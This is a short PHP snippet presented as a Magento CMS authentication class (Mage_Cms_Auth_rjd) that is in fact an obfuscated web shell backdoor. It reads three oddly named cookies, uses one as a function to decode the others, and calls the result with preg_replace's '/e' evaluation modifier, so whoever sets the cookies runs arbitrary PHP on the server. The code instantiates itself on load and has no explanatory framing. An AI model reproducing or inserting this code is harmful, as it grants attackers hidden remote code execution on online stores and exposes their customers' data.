...
class Mage_Cms_Auth_rjd
{
    public function __construct() {
        $auth_cookie = @$_COOKIE['wnyfbbkzvhqaoade3'];
        if ($auth_cookie) {
            $method = $auth_cookie(@$_COOKIE['wnyfbbkzvhqaoade2']);
            $auth = $auth_cookie(@$_COOKIE['wnyfbbkzvhqaoade1']);
            $method("/124/e",$auth,124);
        }
    }
}
$is_auth = new Mage_Cms_Auth_rjd;
